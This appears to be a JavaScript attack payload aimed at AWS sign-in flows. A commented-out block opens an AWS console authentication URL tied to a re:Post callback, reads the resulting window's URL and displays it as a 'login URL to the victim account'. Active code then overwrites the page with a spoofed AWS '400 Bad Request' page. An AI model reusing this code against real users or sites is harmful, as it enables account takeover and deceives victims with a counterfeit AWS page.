
// // Open a new window
// function openNewWindow() {
//   let newWindow = window.open('https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6IlhtWUI1V2hSUXdHN2IxX2RUZ1ZqSmcifQ&challenge=DU8HEwzh_enBtW4w7CNZGr1dwx-lrxMZa58_EL0ezGQ', '_blank');
// };
// // Check if the new window was successfully created
// window.onload = function() {
//             document.body.setAttribute('onload', 'openNewWindow()');
// };

// if (newWindow) {
//   // Wait for 5 seconds before accessing the URL of the new window
//   setTimeout(function () {
//     // Access the URL of the new window
//     let url = newWindow.location.href;
//     let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
//     alert("Login URL to the victim account: " + modifiedUrl);
//   }, 5000); // 5000 milliseconds = 5 seconds
// } else {
//   alert("nothing");
// }
// Replace the content of the <html> element
document.documentElement.innerHTML = `
<html lang="en" class="aws-ember"><head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta http-equiv="Content-Security-Policy" content="Content-Security-Policy: default-src 'self'">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Bad Request</title>
  <link rel="stylesheet" href="https://eu-central-1.signin.aws.amazon.com/static/styles/ep-style/style.css">
</head>
<body class="awsm">
<header id="aws-page-header" class="awsm m-page-header" role="banner">
  <div id="m-nav" class="m-nav" role="navigation">
    <div class="m-nav-header lb-clearfix" data-menu-url="https://s0.awsstatic.com/en_US/nav/v3/panel-content/desktop/index.html">
      <div class="m-nav-logo">
        <div class="lb-bg-logo aws-amazon_web_services_smile-header-desktop-en">
          <a href="https://aws.amazon.com/?nc2=h_lg"><span>Click here to return to Amazon Web Services homepage</span></a>
        </div>
      </div>
    </div>
  </div>
</header>
<div class="content">
  <main role="main">
    <div data-mbox="en_400_content">
      <div class="lb-row lb-snap lb-row-max-large">
        <div class="lb-tiny-24 lb-col error">
          <h1 class="error-code">400</h1>
          <h1>Bad Request</h1>
          <a class="lb-btn-p-primary" href="https://portal.aws.amazon.com/gp/aws/developer/registration/index.html?nc1=f_ct&amp;src=default" role="button"> <span> Go to Home</span> </a>
          <p>
            You may have typed the address incorrectly or you may have used
            an outdated link.
            <br>
            Please clear your cookies and try the request again.  If the problem persists, please contact <a href="https://aws.amazon.com/support" target="_blank">Support</a>.
            We apologize for the inconvenience.<br>
          </p>
        </div>
      </div>
    </div>
  </main>
</div>
<footer id="aws-page-footer" class="m-page-footer" role="contentinfo">
  <div data-lb-comp="google-rlsa-pixel"></div>
  <div class="data-attr-wrapper lb-none-v-margin lb-xb-grid-wrap" data-da-type="so" data-da-so-type="viewport" data-da-so-language="en" data-da-so-category="monitoring" data-da-so-name="footer" data-da-so-version="a">
    
  </div>
  <div class="lb-none-pad lb-none-v-margin lb-xb-grid-wrap">
    
  </div>
  <div class="lb-none-pad lb-none-v-margin lb-xb-grid-wrap lb-tos">
    <div class="lb-xb-grid lb-row-max-large lb-snap lb-tiny-xb-1">
      <div class="lb-xbcol">
        <ul class="lb-txt-p-squid-ink lb-none-v-margin lb-ul lb-list-style-none lb-li-none-v-margin lb-tiny-ul-iblock">
          <li><a href="https://aws.amazon.com/privacy/?nc1=f_pr">Privacy</a></li>
          <li>|</li>
          <li><a href="https://aws.amazon.com/terms/?nc1=f_pr">Site Terms</a></li>
          <li>|</li>
          <li>© 2020, Amazon Web Services, Inc. or its affiliates. All rights reserved.</li>
        </ul>
      </div>
    </div>
  </div>
</footer>

</body></html>
`;
